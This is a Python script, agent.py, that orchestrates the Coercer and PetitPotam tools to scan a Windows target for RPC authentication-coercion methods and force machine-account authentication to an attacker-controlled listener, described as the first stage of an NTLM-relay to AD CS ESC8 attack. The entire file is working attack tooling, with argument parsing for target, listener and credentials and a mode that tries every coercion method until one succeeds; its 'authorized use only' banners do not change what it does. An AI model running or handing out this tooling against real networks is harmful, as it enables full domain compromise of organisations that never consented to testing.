#!/usr/bin/env python3
"""
agent.py - Authentication coercion orchestrator wrapping Coercer / PetitPotam.

Drives the real Coercer (p0dalirius) and PetitPotam (topotam) command-line tools
to (1) scan a target for reachable RPC coercion methods and (2) coerce machine-account
authentication toward an attacker-controlled listener, the front half of an
NTLM-relay -> AD CS ESC8 chain.

AUTHORIZED USE ONLY. Authentication coercion + NTLM relay can yield full domain
compromise. Run only against systems you own or are explicitly authorized to test.

References:
  - Coercer     https://github.com/p0dalirius/Coercer
  - PetitPotam  https://github.com/topotam/PetitPotam
  - ESC8/relay  https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications
"""
import argparse
import shutil
import subprocess
import sys


def _ensure(tool: str) -> str:
    path = shutil.which(tool)
    if not path:
        print(f"[!] required tool not found on PATH: {tool}", file=sys.stderr)
        sys.exit(3)
    return path


def _run(cmd: list) -> int:
    print("[*] exec:", " ".join(cmd))
    try:
        return subprocess.run(cmd, check=False).returncode
    except FileNotFoundError as e:
        print(f"[!] cannot execute: {e}", file=sys.stderr)
        return 3
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        return 130


def coercer_scan(args) -> int:
    """Probe which RPC coercion methods are reachable on the target."""
    _ensure("coercer")
    cmd = ["coercer", "scan", "-t", args.target, "-l", args.listener]
    if args.username:
        cmd += ["-u", args.username]
    if args.password is not None:
        cmd += ["-p", args.password]
    if args.domain:
        cmd += ["-d", args.domain]
    if args.export_json:
        cmd += ["--export-json", args.export_json]
    return _run(cmd)


def coercer_coerce(args) -> int:
    """Trigger authentication using Coercer's coerce mode."""
    _ensure("coercer")
    cmd = ["coercer", "coerce", "-t", args.target, "-l", args.listener]
    if args.username:
        cmd += ["-u", args.username]
    if args.password is not None:
        cmd += ["-p", args.password]
    if args.domain:
        cmd += ["-d", args.domain]
    if args.method:
        cmd += ["--filter-method-name", args.method]
    if args.always_continue:
        cmd += ["--always-continue"]
    return _run(cmd)


def petitpotam(args) -> int:
    """Run PetitPotam.py (MS-EFSR) directly. Expects PetitPotam.py on PATH or via --script."""
    script = args.script or shutil.which("PetitPotam.py") or shutil.which("petitpotam.py")
    if not script:
        print("[!] PetitPotam.py not found; pass --script /path/to/PetitPotam.py",
              file=sys.stderr)
        return 3
    cmd = ["python3", script]
    if args.username:
        cmd += ["-u", args.username]
    if args.password is not None:
        cmd += ["-p", args.password]
    if args.domain:
        cmd += ["-d", args.domain]
    # PetitPotam positional args: <listener> <target>
    cmd += [args.listener, args.target]
    return _run(cmd)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Authorized coercion orchestrator (Coercer/PetitPotam).")
    sub = p.add_subparsers(dest="mode", required=True)

    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("-t", "--target", required=True, help="Target host (e.g. the DC)")
    common.add_argument("-l", "--listener", required=True, help="Listener/relay IP to receive auth")
    common.add_argument("-u", "--username", help="Domain username")
    common.add_argument("-p", "--password", help="Password (may be empty string)")
    common.add_argument("-d", "--domain", help="Domain FQDN")

    s = sub.add_parser("scan", parents=[common], help="Coercer scan mode")
    s.add_argument("--export-json", help="Write scan results to JSON file")
    s.set_defaults(func=coercer_scan)

    c = sub.add_parser("coerce", parents=[common], help="Coercer coerce mode")
    c.add_argument("--method", help="Filter a single method name (e.g. PetitPotam)")
    c.add_argument("--always-continue", action="store_true",
                   help="Try every method until one succeeds")
    c.set_defaults(func=coercer_coerce)

    pp = sub.add_parser("petitpotam", parents=[common], help="Run PetitPotam.py directly")
    pp.add_argument("--script", help="Path to PetitPotam.py")
    pp.set_defaults(func=petitpotam)
    return p


def main() -> int:
    args = build_parser().parse_args()
    print("[i] AUTHORIZED TESTING ONLY -- ensure target is in scope.")
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
